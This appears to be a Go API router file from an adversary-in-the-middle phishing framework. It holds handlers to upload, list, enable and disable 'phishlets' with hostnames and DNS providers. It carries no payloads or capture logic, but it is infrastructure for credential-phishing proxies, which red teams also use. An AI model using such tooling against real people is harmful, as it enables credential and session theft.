package api

import (
	"errors"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) pushPhishlet(w http.ResponseWriter, req *http.Request) {
	body, ok := decodeAndValidate[sdk.PushPhishletRequest](w, req)
	if !ok {
		return
	}

	phishlet, err := r.Phishlets.Push(body.YAML)
	if err != nil {
		if _, ok := errors.AsType[aitm.ParseErrors](err); ok {
			r.writeError(w, http.StatusUnprocessableEntity, err.Error(), nil)
		} else {
			r.writeError(w, http.StatusInternalServerError, "failed to push phishlet", err)
		}
		return
	}

	writeJSON(w, http.StatusOK, definitionToResponse(phishlet))
}

func (r *Router) getPhishlet(w http.ResponseWriter, req *http.Request) {
	cfg, err := r.Phishlets.Get(req.PathValue("name"))
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			r.writeError(w, http.StatusNotFound, "phishlet not found", err)
		} else {
			r.writeError(w, http.StatusInternalServerError, "failed to get phishlet", err)
		}

		return
	}

	writeJSON(w, http.StatusOK, configToResponse(cfg))
}

func (r *Router) listPhishlets(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)

	phishlets, err := r.Phishlets.List()
	if err != nil {
		r.writeError(w, http.StatusInternalServerError, "failed to list phishlets", err)
		return
	}

	page := paginateSlice(phishlets, limit, offset)

	items := make([]sdk.PhishletResponse, len(page))
	for i, cfg := range page {
		items[i] = configToResponse(cfg)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.PhishletResponse]{
		Items:  items,
		Total:  len(phishlets),
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) enablePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")

	body, ok := decodeAndValidate[sdk.EnablePhishletRequest](w, req)
	if !ok {
		return
	}

	p, err := r.Phishlets.Enable(req.Context(), name, body.Hostname, body.DNSProvider)
	if err != nil {
		switch {
		case errors.Is(err, aitm.ErrHostnameRequired):
			r.writeError(w, http.StatusUnprocessableEntity, "hostname is required", err)
		case errors.Is(err, aitm.ErrHostnameConflict):
			r.writeError(w, http.StatusConflict, "hostname is already in use by another phishlet", err)
		default:
			r.writeError(w, http.StatusInternalServerError, "failed to enable phishlet", err)
		}

		return
	}

	writeJSON(w, http.StatusOK, configToResponse(p.Config))
}

func (r *Router) disablePhishlet(w http.ResponseWriter, req *http.Request) {
	p, err := r.Phishlets.Disable(req.Context(), req.PathValue("name"))
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			r.writeError(w, http.StatusNotFound, "phishlet does not exist", err)
		} else {
			r.writeError(w, http.StatusInternalServerError, "failed to disable phishlet", err)
		}

		return
	}

	writeJSON(w, http.StatusOK, configToResponse(p.Config))
}

// getPhishletHosts returns /etc/hosts lines for a phishlet. Stubbed until
// the PhishletResolver is wired into the Router.
func (r *Router) getPhishletHosts(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
}

func configToResponse(p *aitm.PhishletConfig) sdk.PhishletResponse {
	return sdk.PhishletResponse{
		Name:        p.Name,
		BaseDomain:  p.BaseDomain,
		Hostname:    p.Hostname,
		DNSProvider: p.DNSProvider,
		SpoofURL:    p.SpoofURL,
		Enabled:     p.Enabled,
	}
}

func definitionToResponse(p *aitm.Phishlet) sdk.PhishletResponse {
	return sdk.PhishletResponse{
		Name: p.Name,
	}
}
